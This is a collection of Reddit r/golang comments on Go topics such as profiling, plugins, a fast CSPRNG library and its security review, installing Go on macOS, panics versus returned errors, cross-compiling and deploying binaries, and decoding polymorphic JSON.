It depends on which profile you refer to. The memory one is indeed a snapshot of the current memory, allocations done, objects in use and so on. However, the CPU one takes a different approach, and it samples the application in the given amount of time, by default 30 seconds, and then aggregates that information for the reader so that a clear picture over what happened in that time is presented. Finally, we have the execution tracer (which yes, technically is not a profiler), which is much more expensive in terms of resources but it also has a lot more insight into what's happening. It is up to the user to choose what to use based on the needs expressed by the problem. Hope it helps. 
Far less again outside London, but then the lower cost of living and higher quality of life make up for that. That said, there are barely any Go jobs in the UK outside London that I've been able to find.
I'd love to see this test with 1ms, 2ms, and 6ms delays
Tbh I wasn't really expecting any attention on this project, was just intended to be a personal tool. Anyway, cross platform support running in a browser is up now.
Interesting concept. A few thoughts: 1. No errors possible? What about this panic: https://github.com/NebulousLabs/fastrand/blob/master/fastrand.go#L42 2. Interesting that you implement intN and friends on top of this. I have expirimented before with using crypto/rand as a [source](https://golang.org/pkg/math/rand/#Source) for math/rand. I kinda feel like the modulo stuff is fairly orthogonal to the csprng bit. 3. You spawn a goroutine per cpu to do this. Thats probably worth documenting. A library spawning goroutines on init feels a bit scary to me. Perhaps wait until first invocation to spawn those? 4. I agree with epiris that security trumps speed in these cases. It seems fairly straightforward using blake2b like this, but the devil is in the details. You seeding algorithm, particularly with multiple goroutines, is interesting and clever, but I'm no expert.
There have been many different approaches to implementing plugins in Go, from talking to external processes via stdin/stdout (as the already mentioned [pie](https://github.com/natefinch/pie), or [go-plugin](https://github.com/hashicorp/go-plugin), or messaging systems like [Mangos](https://github.com/go-mangos/mangos), to complete scripting language subsystems, like [GopherLua](https://github.com/yuin/gopher-lua), [Otto](https://github.com/robertkrimen/otto) (Javascript), or [Agora](https://github.com/PuerkitoBio/agora). I wrote a round-up of these approaches (plus a tiny demo implementation using RPC) some time ago (especially, at a time before Go got its own [plugin system](https://golang.org/pkg/plugin/) on Linux) in [this blog article](https://appliedgo.net/plugins/). 
Yes, so it is a little bit unfair on that point.
Perhaps because it is not fully supported across platforms yet. Certainly it would have been more prominently announced (and more widely used and written about) if it came with support for macOS and Windows in 1.8. Let's see what 1.9 brings...
It has a slew of other things going against it too. Can't unload plugins. Requires exact same version of all packages in common between host and plugin. I honestly can't see very many use cases that don't devolve into really painful scenarios once either side needs to update pretty much anything.
I'll admit that I'm still pretty much a novice, so take that into consideration. I agree about the generics portion (and share similar sentiments about error handling and overall simplicity of the language). The only time I find myself wanting a generic is for serialization operations and really `interface{}` handles that. I think at this point I've wrote as many lines of go code as any other language so that might have something to do with it. Interesting read. I can't imagine what it would be like to work on such a huge project. Everything I work on now is microservices for various reasons. While nice and tidy it always feels like the complexity is just pushed further up the stack with orchestration and such. It does however make maintaining and developing services feel a lot easier.
&gt; But when I try to build it, gobind cannot find "Java/android/webkit". Also some other packages cannot be found, like builtin ones: "Java/java/lang/Float". I'm wondering if these need to be added to build.gradle as dependencies. e.g. after [line 16](https://github.com/golang/mobile/blob/master/example/reverse/android/build.gradle#L16) something like this? classpath 'java.lang' classpath 'java.lang.float' classpath 'com.android.webkit' I'm least confident on that last one, and I wonder if they need version at the end. But I would presume you'd need to tell gradle what you hope to bind to from Go. I tried to test it out, but I'm not getting past gradle. It wants javap now, so I'll have to go get a JDK instead of a JRE, but I'm done for tonight.
Yes, it's by intention just a hello world test. But it gives a good idea about the overhead of the http stack in the different languages. 
These human named libs piss me off
Care to elaborate a bit how one can use blake2b as a CRNG? IIRC, blake2b is a hashing algorithm, so we need some data to hash; what would that data be?
We would appreciate some review if you have time. Not that a single positive review means that we did it right, but it's a start. You are correct, this package spins up a few goroutines that just hang out in the background, and also has a buffered channel with 32kb of entropy in it. It creates both scheduled pressure and GC pressure. Though, if you are frustrated enough to be looking for alternatives​ to crypto/rand my guess is that you can afford it. Very few applications need more than​ a few bytes of true entropy. There's no reason to switch​ away from a prng that's stuck at 5 MBps if you only need a few hundred bytes.
go's related repository is **[go](http://github.oldjpg.com/repository/7313744)** &gt;golang
https://github.com/NebulousLabs/fastrand/pull/2 ^ do you think that this is a more fair README?
1. It can panic upon init ~~and reseed~~ it doesn't even error check upon reseed (derp). I just opened a PR to eliminate the possibility of error upon reseed. 2. Our primary project uses IntN, BigIntN, and Perm in a few places where cryptographic grade numbers are desired. Seeding math/rand is not enough, there's no guarantee that the internals of math/rand don't screw up the distribution in subtle ways even if the source is truly random (which it can't be, as it's only 64 bits anyway). 3. Opened a PR to document this. Shouldn't be too hard to change it to spin up only as needed, and then spin down when calls slow down, though we probably won't do that ourselves. Happy to review PRs though. 4. Every implementation has to start somewhere. Ours is a compromise between well-reviewed and fast. But, with time it could become both. Or it may be replaced by another library that is both faster and more well reviewed. But at this time I am not aware of a pure go library that has the same order of magnitude of speed as ours while also being equally or more well reviewed.
I've added a PR with benchmarks related to parallelism. crypto/rand does not get speedups when used in parallel (new benchmarks demonstrate this), you are locked to about 10 MB/s global throughput even when multithreading. Further, with our library you'd still see 5x+ speedups even if it only used a single thread. The performance gains are real. Still, our library does use multithreading without consent, which could be a detractor for programs that are heavily optimizing around GC pressure and scheduling pressure.
Of course technically anything can be replaced with Go. Sysadmin tools, build scripts - these are generally not good candidates for go - great for scripting languages though (not specific just python). Tools that require to be usable right out of git repos are another such category (which is the case for sysadmin tools distributed to all boxes via git repo); Ansible, Salt, Supervisord - if you need to write plugins or extend them. Eg: tying their usage/use-case to your internal auth/acl/groups/etc. 
&gt; Yes it is a system call which means cgo and the associated overhead. nit: Not really. AFAIK syscalls are implemented in assembly (not C) and as the semantics of a syscall is much better specified than the semantics of a C-call, most of the overhead isn't there.
I agree, scripting languages (BASH and Python mainly) are much easier to essentially just git clone and run. But recently I've enjoyed the approach of Go - compiling to static binaries and storing as artefacts for deployment.
&gt; (assuming all the time functions work like they should, which seems like a reasonable assumption) Ah, to be young and naïve again..
While I am no expert, and therefore can't go into much details, my experience is that the official installer has made my experience better. I've had issues with Delve or other packages that would refuse to work properly, when I ended up switching to the official installer those problems went away. I may have had a way to fix those issues, but frankly, I'd rather get on with my day than noodle around configuring stuff. My vote goes for the official installer in that case!
So it's like ~2 MB/s. I would not consider it "large amounts of data". 
Awesome, I use NVM so I guess this is the equivalent for Go :)
Thanks! I'll just go that route then. I hope that both the Homebrew and Golang teams can fix whatever is going on. Using an installer is sort of archaic, haha!
At the same time it's super convenient, just grab it and you're good with the new default GOPATH etc... No config required, for me that was a big plus.
Yeah, I basically do the same. I've had great luck for time-testing by just adding local variables for the relevant functions: var time_Now = time.Now var time_After = time.After var time_Sleep = time.Sleep // etc The code looks almost exactly the same, and it's super simple to convert existing code to injected code. In tests I can overwrite those variables to get the desired effects like you do. The downsides are: * I have to be careful to cleanup after each test. * I can't run tests in parallel in that package. If code gets too convoluted with that simple indirection, it usually means the code needs to be refactored to be testable -- in particular if I need to test timing outside of the package (e.g. in uses of the package).
I use Homebrew since quite a while for maintaining Go on my Mac. I never had any issues with it. Also, the formula has always been very up to date. As far as I remember, whenever a new Go version or patch was released, the formula usually was updated within a day. 
I disagree, add a short delay and see what the true overhead is. To give you an example, fasthttp is MUCH slower than stdlib in real world tests. This tells you that fasthttp is designed to seem fast for a non-realistic test.
&gt; I downloaded it last night and rand the benchmarks on my workstation, which has dual 24 core xeons. Your lib int32 was only 30mb vs 15mb from stdlib. I imagine on faster consumer machines with far less cores it would do much better, I didn't test it on my desktop machine. Wow, that really surprises me. On our desktop machines we are seeing 150 MB/s for our lib vs about 12 MB/s for stdlib. Single threaded we were seeing as much as 90 MB/s (desktop again), so if the xeon was down at 30 MB/s that suggests the goroutines are doing a lot of damage! Thanks for the tips, we will probably iterate on the design a bit more.
I did a quick check and it feels a bit clunky. I have to head out shortly, when I return - I'll take some time to give a proper code review
Since a lot of people seem uncomfortable with this, I would like to point out that the core algorithm is essentially the same as [Fortuna](https://www.schneier.com/academic/paperfiles/fortuna.pdf), which FreeBSD uses to implement `/dev/random`. You can also see for yourself that Go's `crypto/rand` package [uses a similar scheme](https://golang.org/src/crypto/rand/rand_unix.go?s=1709:1805) to implement a CSPRNG if `/dev/urandom` is not available. In other words, there is nothing preventing you from creating a CSPRNG in userspace; in fact, the algorithm is fairly simple. It is well-established that once you have a secure seed value, you can generate an enormous amount of randomness from it in a deterministic fashion. Indeed, this is how programs like PGP are able to safely encrypt many messages from a single key. I'm glad to see that people are wary of new crypto packages. That is a healthy instinct! If you aren't a cryptography expert yourself, it's probably best to wait until an expert has given this project their approval.
Homebrew is cancer. 
What are your issues with it? MacOS doesn't have an official package manager :(
What do you use as a package manager? Assuming you're on a Mac.
I've had some errors doing reverse bindings on iOS but never for Android, the following example compiles fine for me. package reverseTest import ( "Java/java/lang" "Java/java/lang/Object" "fmt" ) func TestReverseBinding() { o := NewObject() fmt.Println(o) } func NewObject() lang.Object { return Object.New() } 
I'm on Linux. When I used a Mac, I would just compile shit myself
Anyone have a mirror? site looks to be down.
Very few real world quantities are larger than 2 billion, let alone 4 billion of a uint32. How many real world quantities lay outside the range of 64 bit ints? If you're having problems, fix your units. If you need more precision, then you use special case slower code that can handle those quantities, or floats if a guarantee of fine grain precision is not needed. You're arguing about a very low level detail, from the higher level viewpoint of an application developer with specialized needs. In every case that would put a single 32 bit coordinate out of range I've dealt with in 20 years, usually involving GIS or scientific models, you deal with multiple precision domains. This model of a house or industrial facility, might be stored in a 32bit fixed point format accurate to the millimeter, but its a tiny node in larger dataset representing the terrain around it, where our data is stored in a different format and precision might only be to the quarter meter because that is the error bar in the satellite terrain data. You don't need a single type large enough for everything because the data collected isn't that accurate. In the case of scientific or engineering models, you often don't worry about extreme precisions because the error bars on your functions are larger than the error bars on your floating point numbers, or sensors on some test you are measuring provide a limited resolution (with lots of noise).
Sooo, when I decrypt my super-confidential page, any user (or simple watchdog) can watch/copy it?
Yes. There are no users so everyone has access to any page that they know the name of. For personal use, I just run a personal cowyo with a password protected domain. You could also prime your public page for self destruction before encrypting, which means it can only be viewed once after decryption.
I wish all numbers by default was represented by series of fractions. That way calculations involving pi and sin could be optimized automatically more than what's currently possible.
I have *long* been in favor of this: https://groups.google.com/forum/#!topic/golang-nuts/6KSUwIi57OU/discussion :)
If you're okay waiting some hours~ for the latest release to come out, then using Homebrew is completely fine. If you don't want to be depend on others to be able to update your Go, official installer is probably a better fit for your needs.
Define expert?
I will appreciate it if you do.
Nah, I'll gladly use pacman or yum. I just didn't like any of the options on OSX. Keeping go and rust up to date is easy enough without
See, this? This is FUD. 1.8 was available on Homebrew within hours of the official release, not a day.
Why do you feel the need for the code you're describing, got a more concrete example? FWIW my view of error handling is. - If a function can fail, it's nice that the type signature tells me so - Therefore the language "forces" me to handle the error in some way. Great! I have lived with C#/Java codebases with exceptions being slung around confusing everyone, they suck. - How do I handle an error? 1) If i can actually handle it, i.e i know how to recover from it and do something good, then write the code! 2) If I cant handle it, add some context and return it user, err := service.GetUser(id) if err != nil { return fmt.Errorf("problem getting user %s so i cant promote: %v, id, err) } promoteUser(user) This results in explicit, easy to understand code. If it fails, the logs give me a nice _context sensitive_ message so i can debug it.
I was actually talking about when libraries force a panic on you. I don't particularly like the return-error model, but it's a lot easier to handle than what I'm talking about so I don't really mind it. What I'm talking about is if a library were to do... if (cakes &lt; 0) { panic("not enough cakes") } That then means I have the tedious task of heading my accessing function with defer func() { if err := recover(); err != nil { // do something to handle err } }() Which is quite the bootstrap code. Especially when this only works on a func level, it doesn't go up the call trace hierarchy. Was wondering if there's a better way to handle panics, without crashing the entire goroutine.
Libraries should effectively never panic on you. Which library is doing that? edit: I've been programming Go for 7 years, and I can count the times I've used `recover` on 1 finger.
If the library we're talking about panics for in "normal" cases—that is, in cases different from you calling one of its functions with a value outside of the valid domain for its particular argument,—the library can be said to go against the grain of [how Go libraries have to be written](http://stackoverflow.com/a/22865084/720999), and so I'd recommend to just file a bug against the library asking the author to reconsider what they do. In the same venue, please squint at your own code, too: if you were not supposed to call that library's function passing it the number of cakes less than 0, it's your fault, not the library's. Another approach is to wrap the library in your own shim and trap all possible panics in the shim's methods/functions. I know this stinks but at least you'll be suffering this pain once, and then would just use the shim everywhere in your code not being afraid it could blow up on you. Yet another approach—if feasible in your situation—is to create a custom wrapper function to run goroutines the code in which is to make use of that faulty library. Sure, I'd work only if you're okay with handling those panics at the top level rather than on the spot.
fwiw this has already been posted a year ago here: https://www.reddit.com/r/golang/comments/3w8jtt/a_curated_list_of_articles_complaining_that_go/
Since when is simplicity a bad thing? 
* https://blog.golang.org/error-handling-and-go * https://blog.golang.org/errors-are-values
Those are probably shit libraries. Go is clear on correct style: libraries should never expose panics that user should catch, they should handle it internally and return errors from public functions. Go standard lib is built this way and causes no problems. Now there are people that use panics as exceptions, out of ignorance, preference or some other reason, so when they write Go libraries you may get problems. 
Language design is difficult: for every feature, you have to sacrifice another, or come up with a really good design, and often risk breaking backwards compatibility. I agree with some of the criticisms of Go, in the sense that there are things that would be nice to have, but Go doesn't have to be the one language to rule them all.
I am on Windows 7.
If you don't mind using someone elses abstraction, you might as well... import "qfr"
Reposts are fine... there's a lot of people who are not going to remember or weren't here a year ago in that particular day. 
This is some really toxic place you describe. The language can be enforced through company's policies (or through team leader "wishes" lol). You can be fired because you violated this policies. But another coworker trying to fire you? Did you consider talking about this situation with you HR or management? That doesn't sound healthy or productive at all. 
Can you say more about the specific task and the options on the table? I'll say this: the Docker ecosystem is fully Go, and if you want to play along in another language you're gonna have a bad time...
Not everybody follows the same standards as the standard library, that is, returning an error. Sometimes it's not even the API's fault - sometimes they just don't handle nil pointer checking or errors on internal processes and that causes the VM to panic itself.
The types of issues I'm talking about are both the occasion when a library panics itself explicitly and when it doesn't handle every possible failure such as your example of ParseFile not being able to open/read/parse the file. Libraries that just assume that their check if the file exists is sufficient to skip all pointer checking.
Panics are used as exceptions but the issue is Go lacks the language features to easily try-catch these. 
no oop, has pointers, no this, too simple... how are these even valid. complaining about simplicity in programming no matter what the context is just doesnt make any sense. this is trash
Those are bugs then, so there is nothing else you can do than to recover and cancel what program is doing and notify authors of lib. I wouldn't proceed with action if lib call caused panic.
Because inheritance has become so intertwined with the model of what OOP is.
Funny thing is that most of criticism I have read is along the lines "Go lacks feature X which language Y has". Bottom line, "Go sucks because it is not more like Y". Well great then, use Y instead and leave Go to go its merry way. 
&gt; essentially the same as Fortuna, which FreeBSD uses to implement `/dev/random` At best this comment is extremely misleading. Read the [Fortuna paper](https://www.schneier.com/academic/fortuna/), it's an easy read. They describe multiple components, one of which is a PRNG **Generator** (section 9.4, which at *best*, this fastrand package is *poorly* similar to if you ignore the things Fortuna does even here to prevent an attacker from compromising the state). They then further build on this with an **Acucumulator** (section 9.5) which carefully manages multiple pools of system provided entropy to re-seed the generator in a way made difficult for an attacker to manipulate. It's this last part which is a CSPRNG and is what FreeBSD provides as `/dev/random`. Claiming this fastrand library is at all similar is untrue. 
Hello, You don't need the router to implement that in Go. If you give a method in reference, Go will keep the struct of that method in memory. You can take a look of that example: https://play.golang.org/p/x_aVLWfRi-
&gt; they just don't handle nil pointer checking or errors These don't need to be checked and often shouldn't be. Just as if you are doing `slice[i]` when `i` is out of bounds it is a programming error, calling a package function/method with invalid input is a programming error that should panic. It's the callers responsibility to make sure it's calling things in a valid way. (E.g. a type that is initialised via a filename that doesn't exist should return an error but calling a close method on an un-initialised such type should just panic; it's a programming error for a caller to do something like `f, _ := os.Open("foo"); f.Close()`).
Panicking across a library boundary is *extremely* bad form. Encourage the library author to change this, or fork and fix it yourself.
Since we stopped writing everything in assembly.
I think the one of the better thing that can be done on these articles is to not go apoplectic about how critics do not get it.
&gt; In order to continue, we need to authorize with GitHub. What? I can't even look at documentation/help/code/whatever without signing in?
Then what's the point of learning another language if every language needs to have the same features
So, where's the thing? Did I miss it?
This is just the teaser trailer blog post... &gt; We’re currently working towards open-sourcing it and will announce the release in the coming weeks.
You can pretty much just copy the binary to the server and you are done. You can use Docker if you want, but there isn't any need to.
Yes, you can: GOOS=linux GOARCH=amd64 go build (Other valid architectures are, for example, arm, arm64, mips etc., it depends on what server you have.)
$ GOOS=linux go build
At its heart, Go is always Go, and that's a strength and a weakness. This has the advantage of consistency, which is really a tremendous advantage. But the disadvantage is that, no, `import "qfr"` is not likely to help you if what you need is a new tool, not an interesting way of using a hammer. Go is not an all-encompassing language, nor does it intend to be.
i was a sre at google for several years before moving to another role internally. let me set the record straight in saying sre's python projects have nothing redeemable about them whatsoever. they are a compendium of over-engineering and misused architectural patterns with mixins and kwargs abuse. at the least, they are all ticking bombs waiting to at runtime. the need to ban python for new projects that do not need interoperability with python is completely justified. was once a python readability reviewer until i lost patience with the perpetual poor code quality. sisyphus, masher, viceroy, etc. what a steaming pile. sorry to burst anyone's bubble.
Well it's not like they announced it publicly, but anyone who works at Google could confirm it.
&gt; Especially when this only works on a func level, it doesn't go up the call trace hierarchy. Not sure what you mean by this. A `panic` will propagate up the call stack until it hits a `defer`red `recover()`: https://play.golang.org/p/JGTVANGOfH
Strawman argument. The comparison between programming languages (i.e. formal languages) is nothing like a supposed comparison between informal languages or artistic expression outlets. The latter are purely subjective. The former can be compared in an objective way due to being **formal** languages. I also disagree with the notion that programming languages wouldn't be tools. They are a means to an end. Programming in the end is about solving problems in an economically feasible way (even if you didn't do it for your own monetary profit - in that case you just have another goal such as recognition, proud etc.). You solve problems with, well, tools.
thanks
thanks, I'll check that out 
My favorive was `weird mascot`
export GOARCH=amd64 export GOOS=linux go build That will compile your Go application for modern Linux environments. You can inspect the resulting binary with the `file` tool, to confirm that the binary has the right attributes for the target environment. Then copy the binary to the desired server and run.
Analog checks out. https://play.golang.org/p/NvGyDQpnIz
Many of the things these people dislike about go I love. The simplicity and the power is just amazing for me. Go is a delight
Hahaha, yes, of course. If you go down that route, the only question left is "Why are there even multiple languages in the first place?" But yeah, Turing completeness is not exactly the difficult or important part of language design. In fact, some very useful real-world languages are not Turing complete, like Agda! Also, this is just a side point, but Turing completeness doesn't even cover everything on a theoretical level. Turing completeness says only, "It can be done," but we make more requirements of our computers than that: - "It can be done *quickly*": Though all Turing complete languages can compute the same things eventually, they cannot necessarily do it with the same time complexity. See: Brainfuck, - "I know it will be done right": Languages are not just run, they are also statically inspected. We gain some information even without actually running the code. That knowledge and that analysis are extremely different between languages. (And in the case of something like Agda, this part is actually the primary use-case.) - "It can be written quickly": There is not just runtime complexity, but there is also program size complexity. Even though an algorithm can be written in a Turing complete language, depending on the language the size of that algorithm itself can scale in different ways, even exponentially! - "It will work in many environments": (well, this one isn't theoretical but) Programming languages don't get to have complete control of the computer, they have to be built in a way that allows them to properly use the architecture provided. Nowadays we've got oodles of memory and some standardization which makes this less noticeable, but it really does impact language design. So actually even on an entirely theoretical level it's possible to distinguish languages that are Turing complete, which I find a little interesting!
Programming is only secondarily about the problem it is solving. It is primarily about explaining the problem, about describing it in such a way that other developers can easily understand and work with it. So it is primarily a medium for communication. You can of course still consider it a tool. Just about everything humans use to do anything are tools, but just because it can be considered a tool doesn't mean that is the best way of thinking about it. For instance thinking about it as a tool leads you to think what you are building with it is more important than what you are communicating with it.
... then don't use it. The rest of us sees the benefits and love it. :) I wrote this a while back: * General purpose language. * No semicolon! * Quick to get something done, like using Perl/Python/Ruby, but here you get a binary. * Includes build-in formatting. * A static, portable binary is created - Nothing extra required such as a runtime machine. No classpath, etc. (Build your code into a single binary file with no dependencies. It is just an executable.) * Portable build environment. * Easy to build to multiple platforms. * Go mobile, Easy to build to many platforms (v1.5+ make this even easier). * Many, many libraries out there. https://awesome-go.com/ * Started by very smart people over at Google, backed by Google, meaning great support. * Strong and growing community. * Ridiculously easy to create a web-server. (5 lines) * Concurrency build in (which is great for a web servers) * Testing build in. * Love the ease converting between Go structures and JSON. Makes web development a breeze. * Unicode. (Unicode is a computing industry standard for the consistent encoding, representation, and handling of text expressed in most of the world's writing systems.) * UTC. Very nice with time standard! * Garbage collection (you don't have to care about memory handling) * Very fast compiler. * Don't need header files or Makefiles. Dependences are already in the .go source file. * Return more than one value possible. * Statically typed. * https://godoc.org * https://nathany.com/why-go/ * The Go runtime ensures that any one goroutine isn't blocking the others. Code is written in a synchronous style while being fully non-blocking. There is no need for callbacks, so there is no "callback hell." * Type inference, hash maps (dictionaries), variable-length arrays, methods on any user-defined type, and implicitly satisfied interfaces (A type implements an interface if it implements all methods of the set - http://www.sitepoint.com/closer-look-go-interfaces/). 
&gt; Well great then, use Y instead and leave Go to go its merry way. I hate the whole fuck off mentality that people have when others are upset about a missing feature that's been proven useful in many languages before it.
I don't agree about "not being a tools" but agree about intention. The clarity of intent is a key to productive environment. 
I don't know if it was me but that was painful to read on mobile scaling was off flashing images vs alt text comments kind of sink into the content 
Just started doing some work (DevOps, CI/CD, etc) for a client building a web app in Go. This was pretty much my initial conversation with him. Then I asked about needing Nginx and he said "No, no need for that really, you just can just run the Go app, open the ports and you're done." My response "Wow. I like that."
Having multiple garbage collectors is orthogonal to how many flags there are to configure them. Go could theoretically have a single switch to change the performance characteristics to be more throughput oriented. The language designers definitely did a good job of choosing latency over throughput as a default. However, I don't think you're being realistic with your expectations for negative counterpoints to this GC. It's low latency which just leads to more % time in GC overall - what kind of "really hurts" would you expect to see? I just gave you a perfectly valid and common usecase for a more throughput oriented collector -- you aren't going to get any kind of response besides "we would like a gc with less overhead for our workload". It just comes down to finding a GC that works well for that application type. By the way, if go extends into "media / graphics / audio / games etc" it won't be due to its GC. Things in that domain stay efficient by avoiding allocations (pooling, etc). This is true if it's in Go, Java, or C++. 
So your resume can have 30 different languages when infact it's all just renamed.
Significant whitespace isn't as widely accepted because it's stupid. Who cares if it's more readable when it won't compile at all because someone mixed tabs and spaces? Hell, `gofmt` does that for alignment.
Is there anyone who, given the choice, would simply not indent their code? It's something that everyone is taught from day 1 of coding. It's like capitalizing the first letter of the word that starts a sentence. if you don't, it looks weird. That is simply how code looks. So I actually think the comparison to python is misguided. I don't think people dislike python's significant whitespace because they wouldn't indent otherwise. I think people dislike it because it forces them to twiddle with the format of their code, and they don't want to have to bother with that. I also think this is why gofmt took off. Because it meant we could all stop twiddling with the format of our code, and never have to worry about it again. And because we were all forced to use the same formatting, you never had to worry about your preferred format fighting with someone else's. I just started picking up Rust, and the first thing I did, before moving past hello world, was to figure out how to get rustfmt working in my editor. And I realized why - because I didn't want to be bothered with formatting the code by hand. No one wants to waste their time adding spaces here, figuring out tabs there....
It really does bother me. It hardly resembles a gopher and looks gross.
&gt; I want that for Java And you can. Most IDEs have a code formatter which can be enabled to run automatically, and I'm sure you could get something to run in a script (precommit hook, Gradle task, etc). I want it for JavaScript and C, but I haven't found one I like.
Enter `=']`in Vim after pasting a block, and it'll do the right thing. Here, `=` is the filtering combo and `']` is a special anchor meaning "the end of the just changed block". Emacs also has a combo to "paste-and-indent-in-context".
&gt; Cures memory leaks Its treatment of threads (every goroutine sticks around until its call returns) is a disappointing source of leaks though. How I would have done it differently: collect goroutines by tracing from the running goroutines. Any goroutines that are waiting on channels that are live are also treated as live and traced. This gets rid of goroutine leaks. I don't think that there are any serious performance issues with this approach. The main hurdle would be that explaining goroutine resource usage is a bit more complicated. I think this is an acceptable cost 
The basic principle to save cost by using GAE is: **DON'T use Java**. The golden principle to save cost by using GAE is: **USE Go**. It is just my experience. Here is a comparison: Java Go instance startup time 15 seconds 0.5 second memory comsuming 200M 15M local develop iteration efficiency low high My only complaint about GAE is that they haven't provided a cheaper instance plan with 32M memory for Go runtime.
People don't seem to understand this very simple principle. Nail -&gt; hammer. Screw -&gt; screwdriver. 
Since somebody is a butthurt elitist.
I understand this list is compiled with comical motivations, but I have an honest question as a "2 days in Gopher". I'm a javascript dev, since 10 months I do node.js full time. For the purposes of our [my employers] needs, it's working fine and dandy and I wouldn't pick another language had I had the choice again. I'm a fairly new dev with maybe 3 years of practical experience (PHP, Little Python, basics of C, C++). I read allot as a hobbyist though never considered development a career before (why is not related to my question here). So by most standards, I am not a real developer. I am a web developer :). **Edit** I.e. I have no formal education, self taught. My question is, am I wrong in thinking Go is a systems language worth investing in? Should I be maybe spending some time with another low lever language such as C or C++ to grasp CS concepts which I'll *need* when doing Go? Honestly, I turned to Go because of what I understand Go's strengths are - fast, easy concurrency not extremely different from Erlangs and a "no bullshit"-attitude which makes it hard for me to derail my hobby project into a benchmark e-pen thing. How's the community towards newbies? Open arms or, "be a real dev or GTFO"? *My hobby project is an experiment to understand and write a scalable game server for a WebGL space RTS (at this point simple primitives with colours representing type and position in 3D space). Note, this is an experiment for funnies and I have no intention of actually doing a game - just learning OpenGL/WebGL, Go and modelling a program with heavy use of RPC)*
**Ps** I understand asking in r/golang if Go is worth investing in is somewhat recursive. 
Sounds like you need a better editor. 
It's less about the editor and more about reducing the mental friction. Oh, this is a python project which is using tabs, let me change my editor's settings. Oh, this other C++ project uses totally different settings. I could configure all my editors and all the editors of all my colleagues and open source contributors, but with gofmt, it just does not matter.
I think it's fair that this is a formatting-requirement. I think "any non-word-boundary-changing whitespace-only change" is probably the closest you get to an actual definition of the word "formatting" and it would encompass the braces-style, but not the parens-requirement. You *could* claim, that the fact that the go grammar defines this style makes it a syntactical requirement, but really, that's just how the go language implements this formatting requirement. I truly believe, that the actual argument here is, that approximately no one *really* cares. The ~3 people who do can't seem to shut up about it, but I claim even of those, at least two still *use* gofmt.
You can enable format on save in Eclipse for at least Java: search for editor actions in the settings. A quick search revealed, that it is present since at least mid-2007. JetBrain's IDE's have a plugin for that, but I never used it.
Can you give any actual sources that you are speaking for "the community" here? From what I know, in all practical considerations, the actual overwhelming majority (I would guess &gt;99%) doesn't care about this and *definitely* doesn't care enough to not use gofmt because of it. Can you underpin your claims to the opposite by data? Or are you just asserting that your own opinion is majority based off a small handful of other people feeling similarly?
Had a manager that wouldn't ... hardest code to read.
This one, love it, I only wish it worked with Microsoft SQL as I'm forced to use that at work
If you have another element in the json that tells you what kind of 'type' foo is, you can defer the evaluation of foo for a later time, using json.RawMessage.
[removed]
[removed]
That is a pretty a good definition of an artistic medium.. a tool to accomplish meaningful work.
It does but the VS Code integration is not there. 
Thanks for this. I will be watching :))
[removed]
1. cmd/project_name if project is big enough and I know that internals can be used somewhere else. In simple projects everything goes in top level directory (like 3 to 7 files simple) 2. trash/vndr. They are the only ones who do their job reliably on our dev and prod environments. They are also quite simple to use . YMMV of course. 3. DI through New function or directly during struct initialization. Do not use context.Value for that - only use context for request based data (headers, requestId and so on). Cancelation of app is entirely different story tho... 4. Docker? There is myriad of ways to do this, so I'm not sure that there is any "proper" way. 5. I don't use templates that often so the only thing I can recommend is - look at the other options, maybe? Dunno about their code quality so be careful when with them.
[removed]
[removed]
&gt;If you have another element in the json that tells you what kind of 'type' foo is One hacky approach would be to simply try decoding it as an array, and if that fails, try decoding it as an object.
The two-argument form looking like this: if err, ok := err.(*os.PathError); ok { // ... check code ... } else if err != nil { // ... other errors ... }
Read: https://blog.gopheracademy.com/advent-2016/advanced-encoding-decoding/
&gt; How do you handle dependencies? So far I've used "go get" and just use those, but I've found it was not as easy to update all of them. I'm curious what you would think of [Go Package Store](https://github.com/shurcooL/Go-Package-Store) and whether you think it makes updating Go packages you rely on easier.
&gt; `{` cannot be on the next line. IMO that's less formatting and more syntax [...] `func main()\n{` is not legal in Go is similar to how if `1 &gt; 2` is not legal C Your example of non-legal Go has an `\n` in it, so it concerns whitespace formatting as well as syntax for parsing. Of course I'd rather have optional semicolons than total separation of whitespace and syntax. 
My previous understanding was that "dep" would be integrated directly into the Go toolchain, so this revelation was quite surprising to me. Edit: also, I couldn't figure out how to post this without it sounding click-baity, so apologies for that.
Thank you /u/piratelax40, I've found code reviews to be immensely helpful over the span of my career, so I'm glad I was able to pass along some tips and ideas. Plus, code reviews are just fun!
Like a lot of people are saying: have a few languages in your toolkit is great. Especially because you are introduced to different concepts which helps you to pick up new languages even quicker. Go is doing well in the micro service world. Containerized micro services as the revival of SOA is the shit right now. The overhead of VM languages like Java, Scala closure is not an ideal fit for that architecture. And python is a tool/toy language. I think Go has a great future. 
This is wrong, see below; I'd appreciate it if you'd edit the title or remove the post, so as not to confuse others.
I would switch to ubuntu 16 and systemd. You just need a file: [Unit] Description=www [Service] ExecStart=/opt/www/www WorkingDirectory=/opt/www Restart=always [Install] WantedBy=multi-user.target And then you just need to build the binary for linux and upload it: [remote] $ systemctl stop www [local ] $ rsync -az --delete /tmp/build-www/ {USER}@{MACHINE}:/opt/www [remote] $ systemctl start www These days I use a cloud init script (DO should have something like it): https://github.com/calebdoxsey/cloud-machine/blob/master/install.bash It also creates a proxy with caddy and updates DNS entries in cloudflare to give me automatic failover if an instance dies. I just download the code and build it on the box. Or you can spend the next year attempting to learn modern service orchestration with kubernetes, docker, etc... :)
From what I can see - it's not going to. But it's going to be a working prototype of something that will be. Reason: fundamental flaws with GOPATH and desire not to have `go get` and `go dep` at the same time. There are also implications of big tooling improvements in 1.10 tho this are just speculations. 
This is the problem [editorconfig](http://editorconfig.org/) was invented to solve. You just put a file named ".editorconfig" in the repo containing all the relevant settings, and people's editors will automatically adjust.
thank you, the question is, how would access the information of such nodes? and how would create the internal nodes? the point is to have a structure to store the headers of a document and the respective content of each element for the moment change the focus to "objects" and object structures https://play.golang.org/p/MRUvFBT8CZ
Sure. But then the same applies to any definition of a tool that includes programming languages.
The problem is when you're forced to use Go anyway.
It is https://github.com/Microsoft/vscode-go/issues/771 but no progress ATM. Until language server will get a reasonable caching the Go to definition speed are also going to be worse than the one that is in IDEA. There is also the fact that Gogland completion and definition works with incorrect code, while existing tooling in VS does not. But at the end of the day it's just a matter of personal preference. I still like VS code and use it to quick edit Go projects. 
If there's no type field, the non-hacky way is via https://golang.org/pkg/encoding/json/#Decoder.Token to see what shape the data is. If there is a type field, http://eagain.net/articles/go-dynamic-json/
